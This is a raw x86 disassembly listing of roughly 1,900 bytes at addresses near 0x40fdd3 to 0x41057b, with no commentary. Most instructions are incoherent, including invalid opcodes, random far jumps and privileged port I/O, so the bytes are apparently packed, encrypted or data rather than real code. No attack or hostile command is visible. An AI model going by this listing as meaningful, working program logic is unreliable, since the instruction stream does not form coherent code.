  40fdd3:	test   BYTE PTR [eax-0x3267062d],al
  40fdd9:	addr16 mov ds:0x8a9b,al
  40fddd:	dec    eax
  40fdde:	mov    ds:0xfdc46e82,al
  40fde3:	es nop
  40fde5:	jbe    0x40fe2c
  40fde7:	cmp    al,0xa1
  40fde9:	std    
  40fdea:	cdq    
  40fdeb:	in     al,dx
  40fdec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fded:	rol    DWORD PTR [eax+0x5f24fa23],0x96
  40fdf4:	sbb    esi,edx
  40fdf6:	(bad)  
  40fdf7:	sbb    cl,BYTE PTR [edi-0x660594fb]
  40fdfd:	clc    
  40fdfe:	in     eax,0x18
  40fe00:	out    dx,eax
  40fe01:	das    
  40fe02:	dec    eax
  40fe03:	jne    0x40fde5
  40fe05:	add    ah,cl
  40fe07:	xor    BYTE PTR [ebx],0x8a
  40fe0a:	lock ret 
  40fe0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fe0d:	cmp    eax,0xe44152a5
  40fe12:	mov    al,0x7e
  40fe14:	add    cl,dl
  40fe16:	xchg   ecx,eax
  40fe17:	out    dx,al
  40fe18:	or     dh,BYTE PTR [ecx-0x7f56957c]
  40fe1e:	loop   0x40fe09
  40fe20:	inc    esp
  40fe21:	bound  esp,QWORD PTR [eax]
  40fe23:	jmp    0x6e08:0x49c166b7
  40fe2a:	sub    DWORD PTR [eax+0x30],ebp
  40fe2d:	add    DWORD PTR [ecx],edx
  40fe2f:	(bad)  [ecx+ecx*8]
  40fe32:	dec    edx
  40fe33:	dec    ecx
  40fe34:	add    eax,0x8e100f80
  40fe39:	aam    0xc2
  40fe3b:	dec    ebx
  40fe3c:	jge    0x40fdef
  40fe3e:	call   0x9359:0x9b73f3c4
  40fe45:	xor    al,0x61
  40fe47:	xchg   BYTE PTR [esi],bh
  40fe49:	sub    eax,DWORD PTR [eax+0x76425e19]
  40fe4f:	loope  0x40fe34
  40fe51:	push   0xb5cb5e05
  40fe56:	jb     0x40fe14
  40fe58:	icebp  
  40fe59:	retf   0x8232
  40fe5c:	and    al,0xea
  40fe5e:	fdivr  QWORD PTR [eax-0x15]
  40fe61:	push   edi
  40fe62:	dec    eax
  40fe63:	jnp    0x40fdfd
  40fe65:	xchg   esi,eax
  40fe66:	push   edx
  40fe67:	push   cs
  40fe68:	scas   al,BYTE PTR es:[edi]
  40fe69:	push   cs
  40fe6a:	inc    esp
  40fe6b:	inc    ebp
  40fe6c:	and    ebx,DWORD PTR [ecx]
  40fe6e:	jp     0x40fdf3
  40fe70:	sub    ah,BYTE PTR [eax+0x6eaeab48]
  40fe76:	call   0x3e3d:0x1ba39b62
  40fe7d:	sar    esp,cl
  40fe7f:	pop    ebx
  40fe80:	je     0x40fea5
  40fe82:	hlt    
  40fe83:	lock push es
  40fe85:	mov    eax,ds:0xea845d3e
  40fe8a:	mov    bh,0x92
  40fe8c:	pusha  
  40fe8d:	or     esi,edi
  40fe8f:	stos   BYTE PTR es:[edi],al
  40fe90:	xor    eax,0xec33bebf
  40fe95:	mul    DWORD PTR [eax-0x1e4dda15]
  40fe9b:	add    al,0xa0
  40fe9d:	jbe    0x40fe91
  40fe9f:	mov    eax,ds:0x6adafc42
  40fea4:	daa    
  40fea5:	pop    eax
  40fea6:	call   0x7ea3f08b
  40feab:	adc    DWORD PTR [eax],ebx
  40fead:	xchg   cl,cl
  40feaf:	popf   
  40feb0:	in     al,0x50
  40feb2:	sar    BYTE PTR [ecx+0x1c],1
  40feb5:	fcom   QWORD PTR [edx+0x72b3733e]
  40febb:	push   esi
  40febc:	xor    DWORD PTR [eax-0x5f9d3e05],ebp
  40fec2:	cld    
  40fec3:	mov    bl,0x14
  40fec5:	add    eax,0xc61bc6cc
  40feca:	push   eax
  40fecb:	(bad)  
  40fecd:	push   esi
  40fece:	ret    
  40fecf:	cmp    dh,BYTE PTR [ecx]
  40fed1:	xchg   edx,eax
  40fed2:	rcl    BYTE PTR [eax-0x19d4bdf4],cl
  40fed8:	pop    esp
  40fed9:	push   ss
  40feda:	lahf   
  40fedb:	cmp    BYTE PTR [ecx-0x52a28dbd],0x48
  40fee2:	mov    al,0xed
  40fee4:	aas    
  40fee5:	inc    esi
  40fee6:	jmp    0xca81dfcf
  40feeb:	cmp    al,0xfd
  40feed:	mov    esp,0x3623b9ef
  40fef2:	mov    ebx,DWORD PTR [ebp-0x52fb38d2]
  40fef8:	jmp    0x1642:0x1ba81fb4
  40feff:	retf   
  40ff00:	rcr    BYTE PTR [esi-0x29d9a551],cl
  40ff06:	jge    0x40fef8
  40ff08:	inc    edx
  40ff09:	stos   BYTE PTR es:[edi],al
  40ff0a:	jmp    0xa68b:0xc17d9e6c
  40ff11:	or     DWORD PTR [edx-0x62668ff4],esp
  40ff17:	mov    ds,WORD PTR [ebx-0x19]
  40ff1a:	cs sbb ch,bl
  40ff1d:	mov    ecx,DWORD PTR ds:0xda3880ff
  40ff23:	dec    BYTE PTR [edi+eiz*2-0x2a]
  40ff27:	and    eax,0xc9b90049
  40ff2c:	jo     0x40ffa9
  40ff2e:	addr16 adc al,dh
  40ff31:	out    dx,eax
  40ff32:	stc    
  40ff33:	mov    dl,0x9a
  40ff35:	leave  
  40ff36:	in     eax,0x9
  40ff38:	(bad)  
  40ff39:	jle    0x40fec5
  40ff3b:	aad    0x86
  40ff3d:	jns    0x40ff3e
  40ff3f:	inc    eax
  40ff40:	dec    edx
  40ff41:	jge    0x40fed1
  40ff43:	cdq    
  40ff44:	mov    esi,0xd107a0a2
  40ff49:	inc    edx
  40ff4a:	mov    esp,0xb0a097d1
  40ff4f:	sub    al,0xed
  40ff51:	(bad)  
  40ff52:	jg     0x40ff62
  40ff54:	push   ebp
  40ff55:	outs   dx,DWORD PTR ds:[esi]
  40ff56:	shl    BYTE PTR [ecx+0x58],0xfa
  40ff5a:	(bad)  
  40ff5b:	and    DWORD PTR [edi],ebp
  40ff5d:	clc    
  40ff5e:	mov    ebx,DWORD PTR [esp+eiz*2]
  40ff61:	shr    DWORD PTR [edx+0x6cfb7636],1
  40ff67:	dec    ebp
  40ff68:	cwde   
  40ff69:	xor    edx,DWORD PTR [eax-0x2]
  40ff6c:	sbb    eax,0xc044fd3d
  40ff71:	dec    eax
  40ff72:	test   DWORD PTR [ebx-0x1f],esp
  40ff75:	add    al,0xc9
  40ff77:	ret    0xfb7f
  40ff7a:	dec    ebx
  40ff7b:	mov    ss,WORD PTR [esi]
  40ff7d:	mov    esi,DWORD PTR fs:0xda002297
  40ff84:	or     DWORD PTR [edx-0x7ddd9d1c],ebp
  40ff8a:	cs mov dl,0xbe
  40ff8d:	(bad)  
  40ff8e:	(bad)  
  40ff8f:	xchg   edx,eax
  40ff90:	jbe    0x40ff18
  40ff92:	test   eax,0x3af3062f
  40ff97:	sbb    edx,esi
  40ff99:	std    
  40ff9a:	cdq    
  40ff9b:	je     0x40ffe2
  40ff9d:	pop    eax
  40ff9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ff9f:	jecxz  0x40ff65
  40ffa1:	mov    cl,0x5c
  40ffa3:	adc    BYTE PTR [esi],bl
  40ffa5:	sbb    DWORD PTR [eax-0x4a9c62bf],0x99e48f8b
  40ffaf:	mul    DWORD PTR [edi]
  40ffb1:	cwde   
  40ffb2:	and    DWORD PTR [eax+esi*4+0x1eb968c2],edi
  40ffb9:	dec    ecx
  40ffba:	cmc    
  40ffbb:	inc    ebp
  40ffbc:	push   ebx
  40ffbd:	jmp    0x40ff78
  40ffbf:	fmul   st(0),st
  40ffc1:	mov    WORD PTR [ebx+0x35],cs
  40ffc4:	ins    BYTE PTR es:[edi],dx
  40ffc5:	test   ch,dl
  40ffc7:	mov    esi,0x181d67aa
  40ffcc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ffcd:	mov    dh,0x72
  40ffcf:	fimul  WORD PTR [ecx-0xe]
  40ffd2:	mov    bh,0x81
  40ffd4:	sub    eax,0xf71a4574
  40ffd9:	push   0x6b
  40ffdb:	xchg   BYTE PTR [edx+0x56bc69d1],ch
  40ffe1:	dec    esp
  40ffe2:	and    eax,0xc7dd73e5
  40ffe7:	out    dx,al
  40ffe8:	jecxz  0x410021
  40ffea:	inc    edi
  40ffeb:	std    
  40ffec:	cmp    DWORD PTR [esp+esi*1+0x6bf8d452],ecx
  40fff3:	idiv   BYTE PTR [ebp+0x22]
  40fff6:	mov    bh,0x7a
  40fff8:	(bad)  [edi]
  40fffa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fffb:	mov    BYTE PTR [ecx+0x47],0xb9
  40ffff:	sub    esi,DWORD PTR [ecx]
  410001:	mov    al,ds:0xd01cb5fa
  410006:	xor    eax,0xba5bff85
  41000b:	shr    BYTE PTR [edx+0x610f1a3b],0x9e
  410012:	stc    
  410013:	mov    ecx,0x58549efe
  410018:	out    0xcd,al
  41001a:	push   es
  41001b:	pop    edi
  41001c:	sub    BYTE PTR [edi],al
  41001e:	scas   al,BYTE PTR es:[edi]
  41001f:	in     eax,dx
  410020:	addr16 ret 
  410022:	pop    ss
  410023:	in     al,0xe6
  410025:	sbb    ah,BYTE PTR [ecx-0x59]
  410028:	leave  
  410029:	(bad)  
  41002a:	mov    dh,0x1a
  41002c:	fs jbe 0x41006a
  41002f:	pop    edi
  410030:	cmc    
  410031:	es dec ecx
  410033:	inc    ecx
  410034:	loopne 0x410014
  410036:	sbb    eax,0x114ae92e
  41003b:	hlt    
  41003c:	mov    dh,0x94
  41003e:	jp     0x4100ad
  410040:	xchg   dl,cl
  410042:	mov    bh,0xe3
  410044:	(bad)  
  410046:	imul   esp,edx,0x9c22de47
  41004c:	retf   
  41004d:	in     eax,0x39
  41004f:	xchg   ecx,eax
  410050:	sub    ebx,DWORD PTR [esi-0x3aa45c31]
  410056:	outs   dx,BYTE PTR ds:[esi]
  410057:	mov    esi,0xe8dd0423
  41005c:	shl    esi,1
  41005e:	imul   BYTE PTR [esi-0x20f722d3]
  410064:	adc    esi,DWORD PTR [edx+esi*4]
  410067:	sub    al,0x29
  410069:	mov    cs,WORD PTR [ecx+edx*2]
  41006c:	mov    DWORD PTR ds:0x3d0baf8c,eax
  410072:	push   ecx
  410073:	aaa    
  410074:	push   edx
  410075:	cli    
  410076:	push   ebp
  410077:	fstp   TBYTE PTR gs:[edi-0x26]
  41007b:	daa    
  41007c:	sbb    ch,ch
  41007e:	add    BYTE PTR [esi+0x12888a33],0x47
  410085:	cdq    
  410086:	data16 mov bl,0x34
  410089:	daa    
  41008a:	popa   
  41008b:	dec    ecx
  41008c:	sar    BYTE PTR [edi],cl
  41008e:	xor    eax,0xd7ff4a7e
  410093:	(bad)  
  410094:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410095:	in     eax,dx
  410096:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410097:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410098:	fidiv  WORD PTR [edi]
  41009a:	in     al,0x3d
  41009c:	jmp    0x410091
  41009e:	push   ds
  41009f:	popf   
  4100a0:	and    edx,DWORD PTR [ecx]
  4100a2:	add    eax,0x2a62914e
  4100a7:	cdq    
  4100a8:	mov    ds:0x60332899,eax
  4100ad:	mov    ebx,0x9c73fb8a
  4100b2:	and    BYTE PTR [edx],bh
  4100b4:	inc    ax
  4100b6:	rol    BYTE PTR [edi-0x78],0x3b
  4100ba:	int3   
  4100bb:	ins    BYTE PTR es:[edi],dx
  4100bc:	mov    edi,0x85821a0f
  4100c1:	dec    eax
  4100c2:	sti    
  4100c3:	into   
  4100c4:	cli    
  4100c5:	lock jo 0x41010f
  4100c8:	clc    
  4100c9:	test   al,0x59
  4100cb:	mov    esp,0xe86e9b6a
  4100d0:	push   ecx
  4100d1:	xlat   BYTE PTR ds:[ebx]
  4100d2:	cmc    
  4100d3:	aaa    
  4100d4:	sbb    eax,0x5892781d
  4100d9:	xchg   BYTE PTR [eax],al
  4100db:	or     al,0xf3
  4100dd:	dec    esp
  4100de:	adc    BYTE PTR [eax],ch
  4100e0:	mov    eax,0x9a1d6e53
  4100e5:	push   ebx
  4100e6:	sbb    DWORD PTR [edi-0x4be9ee28],eax
  4100ec:	mov    bh,0x64
  4100ee:	(bad)  
  4100ef:	pop    edx
  4100f0:	push   edx
  4100f1:	jo     0x410125
  4100f3:	int    0x98
  4100f5:	popa   
  4100f6:	js     0x4100c7
  4100f8:	dec    ebx
  4100f9:	jmp    0xba409075
  4100fe:	and    WORD PTR [edx-0x6ac6a61b],bp
  410105:	adc    DWORD PTR [esi+ebp*8-0x14e75cf8],ebp
  41010c:	push   cs
  41010d:	(bad)  
  41010e:	xor    al,0x8f
  410110:	lock sahf 
  410112:	scas   al,BYTE PTR es:[edi]
  410113:	dec    eax
  410114:	sub    ecx,ebx
  410116:	cli    
  410117:	ret    
  410118:	fisubr DWORD PTR [esi-0x476c91af]
  41011e:	jecxz  0x41012a
  410120:	jne    0x410179
  410122:	cdq    
  410123:	dec    esp
  410125:	or     ah,BYTE PTR [ecx-0x5c8fda5]
  41012b:	jmp    0x4101a7
  41012d:	leave  
  41012e:	adc    eax,0x232c448e
  410133:	and    dl,al
  410135:	arpl   WORD PTR ds:0x4aaa6fd9,ax
  41013b:	xchg   BYTE PTR [edi],dl
  41013d:	sti    
  41013e:	mov    BYTE PTR [edx-0x46922167],al
  410144:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410145:	xchg   BYTE PTR [eax-0x9],ah
  410148:	rol    DWORD PTR [ecx+0x12],0x6f
  41014c:	xor    BYTE PTR [ecx+0x24ba21a9],dl
  410152:	(bad)  
  410154:	xchg   DWORD PTR [eax],ebx
  410156:	xchg   ebp,edi
  410158:	add    al,0xc2
  41015a:	and    ebp,eax
  41015c:	(bad)  
  41015d:	(bad)  
  41015e:	retf   
  41015f:	ins    DWORD PTR es:[edi],dx
  410160:	inc    eax
  410161:	outs   dx,DWORD PTR ds:[esi]
  410162:	or     bl,BYTE PTR [ecx+0x45]
  410165:	mov    dh,0x8
  410167:	lock cs stos BYTE PTR es:[edi],al
  41016a:	aaa    
  41016b:	rol    BYTE PTR ds:0xee5dfc8c,cl
  410171:	xchg   edx,eax
  410172:	inc    eax
  410173:	loope  0x410167
  410175:	mov    eax,0x5ac8d8d
  41017a:	fwait
  41017b:	mov    ds:0x6c51a81b,eax
  410180:	xor    DWORD PTR [eax-0xc],ebp
  410183:	mov    eax,ds:0xfc6d7bb1
  410188:	jp     0x41017b
  41018a:	or     ch,cl
  41018c:	mov    ah,0xe1
  41018e:	cli    
  41018f:	ds dec edi
  410191:	xchg   edx,eax
  410192:	je     0x410174
  410194:	pop    ebp
  410195:	sub    eax,edx
  410197:	dec    ebp
  410198:	push   0xf69f395
  41019d:	sahf   
  41019e:	enter  0x3972,0x1
  4101a2:	ins    DWORD PTR es:[edi],dx
  4101a3:	mov    ebx,DWORD PTR [edi-0x4e]
  4101a6:	pop    es
  4101a7:	loop   0x4101ed
  4101a9:	xchg   ebp,eax
  4101aa:	mov    ecx,0x7016d7eb
  4101af:	jmp    0xff340c51
  4101b4:	push   eax
  4101b5:	(bad)  
  4101b6:	hlt    
  4101b7:	inc    eax
  4101b8:	pop    edx
  4101b9:	dec    ebx
  4101ba:	adc    BYTE PTR [esp+edi*8+0x2df6318b],ah
  4101c1:	call   FWORD PTR [eax]
  4101c3:	hlt    
  4101c4:	out    dx,al
  4101c5:	pop    DWORD PTR [ecx-0x7f05e9af]
  4101cb:	sti    
  4101cc:	mov    esp,0x1e948bcc
  4101d1:	jge    0x4101b3
  4101d3:	call   0x913944bf
  4101d8:	jns    0x4101df
  4101da:	push   edi
  4101db:	cs pop edi
  4101dd:	mov    eax,ds:0x95a13270
  4101e2:	xchg   esi,eax
  4101e3:	adc    BYTE PTR [edi-0x32dbab34],al
  4101e9:	test   al,0xa5
  4101eb:	in     eax,dx
  4101ec:	sub    DWORD PTR ds:0xee270af,esi
  4101f2:	dec    eax
  4101f3:	leave  
  4101f4:	es mov dl,0xcf
  4101f7:	es mov esi,0x67dbf695
  4101fd:	test   DWORD PTR [ecx],ebp
  4101ff:	imul   edx,ecx,0x7b
  410202:	mov    esp,0x43f41988
  410207:	add    eax,0xff365f6c
  41020c:	fidiv  DWORD PTR [ecx]
  41020e:	rcl    DWORD PTR [edx],0x78
  410211:	adc    edi,DWORD PTR [ecx+0x73]
  410214:	dec    esi
  410215:	icebp  
  410216:	jle    0x4101e1
  410218:	mov    eax,ds:0x3dd7ec70
  41021d:	(bad)  
  41021e:	icebp  
  41021f:	mov    ebx,0xcd305889
  410224:	out    dx,eax
  410225:	and    BYTE PTR [edi-0x7a],cl
  410228:	mov    esp,0x2ffbaded
  41022d:	cmc    
  41022e:	sub    esp,eax
  410230:	jne    0x41028a
  410232:	dec    edx
  410233:	scas   al,BYTE PTR es:[edi]
  410234:	fcmovnu st,st(7)
  410236:	sbb    dl,BYTE PTR es:[esi+0x76]
  41023a:	mov    dh,0x7a
  41023c:	jnp    0x4101ef
  41023e:	push   eax
  41023f:	dec    ecx
  410240:	inc    ebp
  410241:	dec    esi
  410242:	loop   0x410232
  410244:	hlt    
  410245:	ret    0x9dba
  410248:	sahf   
  410249:	loopne 0x410267
  41024b:	out    0xf9,al
  41024d:	jmp    0x9b69:0x8329294e
  410254:	inc    edx
  410255:	jno    0x410258
  410257:	dec    ebp
  410258:	out    dx,eax
  410259:	xor    eax,0xe37bf5b2
  41025e:	cdq    
  41025f:	xor    BYTE PTR [edi],0x81
  410262:	pushf  
  410263:	popa   
  410264:	inc    ebx
  410265:	enter  0x66f4,0x7c
  410269:	and    esi,ecx
  41026b:	not    DWORD PTR [edi]
  41026d:	pop    ss
  41026e:	cmp    al,0x41
  410270:	mov    ds:0xffab3b66,al
  410275:	imul   BYTE PTR [edi]
  410277:	and    ch,ah
  410279:	nop
  41027a:	aad    0x23
  41027c:	loop   0x4102ec
  41027e:	test   DWORD PTR ss:[ebx+0x6a036a14],ebp
  410285:	cmc    
  410286:	cld    
  410287:	xchg   edx,eax
  410288:	and    esp,ebp
  41028a:	iret   
  41028b:	ins    DWORD PTR es:[edi],dx
  41028c:	fistp  DWORD PTR [ebp+0xc79d51a]
  410292:	xchg   DWORD PTR [ebp-0x413ae78],edi
  410298:	rcl    BYTE PTR [ebp+ecx*1+0x3a],0x7e
  41029d:	mov    eax,0x730382c5
  4102a2:	jp     0x4102b4
  4102a4:	add    DWORD PTR ds:0xed5c2690,edi
  4102aa:	xor    edx,DWORD PTR [ebp-0x4f]
  4102ad:	xchg   bh,dl
  4102af:	pop    edi
  4102b0:	pop    eax
  4102b1:	inc    DWORD PTR ds:0x9ed10e9a
  4102b7:	cmp    ebx,DWORD PTR [eax]
  4102b9:	xchg   esi,eax
  4102ba:	xchg   edx,eax
  4102bb:	enter  0x803e,0x4e
  4102bf:	test   al,0x5d
  4102c1:	lods   eax,DWORD PTR ds:[esi]
  4102c2:	clc    
  4102c3:	test   al,0xe
  4102c5:	xchg   edx,eax
  4102c6:	hlt    
  4102c7:	xor    DWORD PTR [edx-0x777f8254],edx
  4102cd:	or     eax,0x68b66dc
  4102d2:	jo     0x410255
  4102d4:	add    DWORD PTR ds:0x798bf305,edx
  4102da:	in     eax,dx
  4102db:	push   esp
  4102dc:	xchg   edx,eax
  4102dd:	inc    ebx
  4102de:	jl     0x4102fd
  4102e0:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  4102e2:	pop    ebp
  4102e3:	or     eax,0x2d89bf42
  4102e8:	jb     0x41031d
  4102ea:	inc    edi
  4102eb:	jmp    0x3ed76469
  4102f0:	add    ah,BYTE PTR [ebp+0x1f]
  4102f3:	out    0x9f,al
  4102f5:	mov    al,ds:0xb34af881
  4102fa:	test   al,0xe2
  4102fc:	mov    ebp,0xd2b6a1e6
  410301:	ds dec ebx
  410303:	mov    ch,ah
  410305:	popa   
  410306:	in     al,dx
  410307:	into   
  410308:	iret   
  410309:	in     al,dx
  41030a:	inc    esi
  41030b:	inc    esp
  41030c:	mov    ds:0xa7ce0342,al
  410311:	pop    ss
  410312:	inc    ebp
  410313:	xor    eax,0x8a4fdeaa
  410318:	dec    edx
  410319:	ins    BYTE PTR es:[edi],dx
  41031a:	xchg   ebx,eax
  41031b:	mov    WORD PTR [ebp-0x5ce79b0a],?
  410321:	popa   
  410322:	shl    DWORD PTR [ebp-0x742398af],0x98
  410329:	or     al,0xc7
  41032b:	ins    BYTE PTR es:[edi],dx
  41032c:	sub    eax,DWORD PTR [edx-0xb62e23d]
  410332:	stos   DWORD PTR es:[edi],eax
  410333:	sub    DWORD PTR [ebx+ebx*2-0x6b],ecx
  410337:	and    bl,BYTE PTR [ebp+0x73]
  41033a:	push   esi
  41033b:	cmp    edi,DWORD PTR [esi]
  41033d:	push   es
  41033e:	push   0xb2673abd
  410343:	out    0x41,al
  410345:	and    DWORD PTR [esi-0x34a90f35],ebp
  41034b:	out    dx,al
  41034c:	lods   eax,DWORD PTR ds:[esi]
  41034d:	add    bl,BYTE PTR [ebx]
  41034f:	adc    al,0x41
  410351:	pop    ds
  410352:	mov    eax,ds:0x6e52714b
  410357:	sbb    al,0x87
  410359:	enter  0x8022,0x9a
  41035d:	ss lahf 
  41035f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410360:	push   eax
  410361:	dec    ecx
  410362:	mov    ?,edi
  410364:	sbb    ah,BYTE PTR [ebp+0x32]
  410367:	add    al,bh
  410369:	xchg   ebp,eax
  41036a:	pushf  
  41036b:	cmc    
  41036c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41036d:	mov    bl,BYTE PTR [ebp+0x2]
  410370:	mov    ch,0xb8
  410372:	adc    eax,0x68d40e18
  410377:	imul   eax,DWORD PTR [esi],0xffffffc8
  41037a:	jp     0x41036d
  41037c:	mov    eax,ds:0xe56cbe65
  410381:	sbb    DWORD PTR [ecx],esp
  410383:	inc    esp
  410384:	aaa    
  410385:	fiadd  WORD PTR [ebp+0x49f1b755]
  41038b:	add    bh,BYTE PTR ds:0x2d18969a
  410391:	icebp  
  410392:	and    eax,DWORD PTR [ecx+0x9da1edc]
  410398:	sti    
  410399:	call   0xb3a5e782
  41039e:	jp     0x4103e9
  4103a0:	xor    eax,0xf7c66ce3
  4103a5:	dec    esp
  4103a6:	mov    ds:0x179ab2c8,al
  4103ab:	repnz pop ebp
  4103ad:	mov    esp,DWORD PTR [edi+0x61]
  4103b0:	inc    esp
  4103b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4103b2:	or     ebp,DWORD PTR [esi+ecx*4-0x10beabbb]
  4103b9:	inc    esi
  4103ba:	sbb    ebp,DWORD PTR [ebx+0x3972f175]
  4103c0:	push   ebp
  4103c1:	pop    edx
  4103c2:	int3   
  4103c3:	jmp    0xc97:0xc72e9402
  4103ca:	sbb    BYTE PTR [edi-0xe],bh
  4103cd:	das    
  4103ce:	mov    cl,BYTE PTR [eax+0x17]
  4103d1:	fild   WORD PTR es:[edx-0x1aa74510]
  4103d8:	xchg   edx,eax
  4103d9:	dec    esp
  4103da:	(bad)  
  4103db:	adc    BYTE PTR [edx],bh
  4103dd:	scas   al,BYTE PTR es:[edi]
  4103de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4103df:	scas   al,BYTE PTR es:[edi]
  4103e0:	fs retf 
  4103e2:	push   eax
  4103e3:	jns    0x4103f0
  4103e5:	mov    cl,0x48
  4103e7:	mov    WORD PTR [ebx+0x71769fc6],ds
  4103ed:	add    al,0x2c
  4103ef:	mov    edx,ecx
  4103f1:	scas   eax,DWORD PTR es:[edi]
  4103f2:	xor    dl,BYTE PTR [ebp+0x12]
  4103f5:	bound  edi,QWORD PTR [ebp-0x2cbf7768]
  4103fb:	xchg   edx,eax
  4103fc:	call   0x9197531f
  410401:	fldenv [esi-0x12]
  410404:	xor    esi,DWORD PTR [ecx+0x3]
  410407:	and    dh,BYTE PTR [ebp+edi*8-0x3e417238]
  41040e:	std    
  41040f:	pop    esi
  410410:	das    
  410411:	(bad)  
  410413:	rol    DWORD PTR [edi+esi*8+0x7b],0x7
  410418:	test   DWORD PTR [edi+0x5d6eb99],ecx
  41041e:	add    eax,0xe669e1ee
  410423:	mov    ch,bh
  410425:	mov    ch,0xd4
  410427:	xchg   edi,eax
  410428:	(bad)  
  41042a:	fcom   DWORD PTR ds:0x410e5bb
  410430:	xlat   BYTE PTR ds:[ebx]
  410431:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410432:	arpl   WORD PTR [esi-0x68],sp
  410435:	ins    BYTE PTR es:[edi],dx
  410436:	iret   
  410437:	(bad)  
  410438:	sbb    eax,0x30c2336a
  41043d:	je     0x4103fd
  41043f:	out    0x22,eax
  410441:	pop    ebx
  410442:	jmp    0x5eaa:0x603cd4e7
  410449:	add    bh,ah
  41044b:	scas   eax,DWORD PTR es:[edi]
  41044c:	(bad)  
  41044d:	out    dx,al
  41044e:	sar    BYTE PTR [eax+0x3f],1
  410451:	rcl    DWORD PTR [ebx],cl
  410453:	xor    BYTE PTR [edx],dl
  410455:	or     BYTE PTR [eax-0x6],0x4e
  410459:	cdq    
  41045a:	mov    ebp,0xc39f1890
  41045f:	xor    eax,0x9b9b384b
  410464:	pop    ebp
  410465:	mov    ds:0x54ca61b,eax
  41046a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41046b:	je     0x410456
  41046d:	push   ds
  41046e:	dec    ecx
  41046f:	add    eax,0x2ed83d72
  410474:	gs cmp esp,esp
  410477:	out    0x5c,eax
  410479:	jne    0x41049b
  41047b:	push   ecx
  41047c:	nop
  41047d:	add    edi,DWORD PTR [edi-0x2a]
  410480:	push   esp
  410481:	and    BYTE PTR [edx+edx*8],bh
  410484:	int    0x2c
  410486:	xchg   BYTE PTR [ebx],bh
  410488:	sub    al,0x4a
  41048a:	cdq    
  41048b:	xor    al,0x37
  41048d:	aas    
  41048e:	adc    esp,DWORD PTR [edx+0x55]
  410491:	scas   al,BYTE PTR es:[edi]
  410492:	mov    cl,dl
  410494:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410495:	mov    dl,dl
  410497:	cli    
  410498:	fnstenv [esi+0x3f]
  41049b:	cwde   
  41049c:	or     ebp,esi
  41049e:	sbb    DWORD PTR ds:0x38fae244,edx
  4104a4:	les    ebp,FWORD PTR [ebp-0x5c]
  4104a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4104a8:	dec    esi
  4104a9:	adc    ah,BYTE PTR [ecx-0x34e1a079]
  4104af:	dec    ebx
  4104b0:	push   cs
  4104b1:	xchg   esp,eax
  4104b2:	sbb    eax,0x293e1f7c
  4104b7:	and    al,0xa5
  4104b9:	call   0xc3401623
  4104be:	enter  0x397f,0xd5
  4104c2:	ss in  al,dx
  4104c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4104c5:	sub    DWORD PTR [eax-0x1a],eax
  4104c8:	rcr    BYTE PTR [edi-0x278abda0],1
  4104ce:	pop    ecx
  4104cf:	mov    ebp,0xd1f11235
  4104d5:	and    esp,DWORD PTR [ebp+0x1ca87ff8]
  4104db:	psllq  mm5,QWORD PTR [ebx+0x67bb0e6]
  4104e2:	jnp    0x4104fb
  4104e4:	pop    es
  4104e5:	or     DWORD PTR [ecx],0x43
  4104e8:	div    BYTE PTR [ebp-0x66]
  4104eb:	cmp    BYTE PTR [ebx-0x57ff8399],al
  4104f1:	jg     0x41056b
  4104f3:	adc    DWORD PTR [eax-0x17],ebp
  4104f6:	mov    edx,0x35a1c3b7
  4104fb:	sahf   
  4104fc:	mov    eax,0x808eb5f8
  410501:	imul   esp,DWORD PTR [edi],0x186f0c14
  410507:	popa   
  410508:	add    al,0xd9
  41050a:	mov    esp,0xfc66b8c9
  41050f:	pop    ebx
  410510:	outs   dx,DWORD PTR ds:[esi]
  410511:	dec    eax
  410512:	out    dx,eax
  410513:	and    edx,DWORD PTR [ebx-0x4f]
  410516:	adc    edx,DWORD PTR [edx+esi*4]
  410519:	in     al,0x50
  41051b:	jb     0x41058d
  41051d:	xchg   ebx,eax
  41051e:	out    0x23,al
  410520:	repnz lds eax,FWORD PTR [ebx+0x4d4c90f9]
  410527:	mov    ch,0xe0
  410529:	push   es
  41052a:	cmc    
  41052b:	push   ebx
  41052c:	int    0x12
  41052e:	xor    al,0x31
  410530:	popf   
  410531:	jecxz  0x41053d
  410533:	jne    0x41057d
  410535:	or     edi,DWORD PTR [esi]
  410537:	cmp    cl,BYTE PTR [edi]
  410539:	ins    DWORD PTR es:[edi],dx
  41053a:	sub    eax,0x61317925
  41053f:	jle    0x410545
  410541:	pop    ebx
  410542:	sbb    edi,DWORD PTR [esi]
  410544:	jp     0x4105af
  410546:	fs (bad) 
  410548:	and    ch,BYTE PTR [ebx-0x24]
  41054b:	or     ebx,esp
  41054d:	jo     0x41057f
  41054f:	arpl   WORD PTR [ebp+edi*8-0x210f5c69],bx
  410556:	sub    eax,0x27afbc8d
  41055b:	push   esi
  41055c:	lds    eax,FWORD PTR [ebx-0x2b45c72a]
  410562:	lods   al,BYTE PTR ds:[esi]
  410563:	xor    DWORD PTR [edi+0x5a],ebx
  410566:	leave  
  410567:	add    BYTE PTR [edi+0x0],cl
  41056a:	ja     0x41051d
  41056c:	and    dh,BYTE PTR [ebx-0x67]
  41056f:	sahf   
  410570:	scas   eax,DWORD PTR es:[edi]
  410571:	les    eax,FWORD PTR [ecx+0x2b33518f]
  410577:	fisub  WORD PTR [eax]
  410579:	or     DWORD PTR [ebx],ecx
  41057b:	mov    al,ds:0xa37e7cd2
